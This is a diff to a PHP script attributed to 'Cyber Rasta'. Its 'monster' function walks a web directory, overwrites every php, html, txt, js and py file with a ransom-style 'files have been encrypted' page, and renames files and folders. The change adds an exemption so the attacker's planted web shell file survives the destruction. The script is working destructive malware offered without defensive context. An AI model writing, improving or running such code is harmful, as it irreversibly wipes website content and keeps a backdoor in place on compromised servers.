@@ -8,8 +8,12 @@ function monster($dir) {
     foreach ($iterator as $fileInfo) {
         $oldName = $fileInfo->getPathname();
 
+        if ($fileInfo->getFilename() === 'Webshell by CyberRasta.php7') {
+            continue;
+        }
+
         if ($fileInfo->isFile() && in_array($fileInfo->getExtension(), ['php', 'html', 'txt', 'js', 'py', 'txt'])) {
-            file_put_contents($oldName, '<?php echo "Encrypted Cyber Rasta"; ?>');
+            file_put_contents($oldName, '<?php echo "<h1>Your files have been encrypted by Cyber Rasta</h1>"; ?>');
         }
 
         $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'index.php';
@@ -28,24 +32,27 @@ function monster($dir) {
     }
 
     foreach ($iterator as $fileInfo) {
-        if ($fileInfo->isDir()){
+        if ($fileInfo->getFilename() === 'Webshell by CyberRasta.php7') {
+            continue;
+        }
+
+        if ($fileInfo->isDir()) {
             $oldName = $fileInfo->getPathname();
             $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'Encrypted';
 
-            if (file_exists($newName)){
+            if (file_exists($newName)) {
                 $i = 1;
-                while(file_exists($newName . " $i")){
+                while (file_exists($newName . " ($i)")) {
                     $i++;
                 }
                 $newName .= " ($i)";
             }
 
-            if (!rename($oldName, $newName)){
+            if (!rename($oldName, $newName)) {
                 echo "Não foi possível renomear $oldName";
             }
         }
     }
-
 }
 
 $directory = __DIR__;
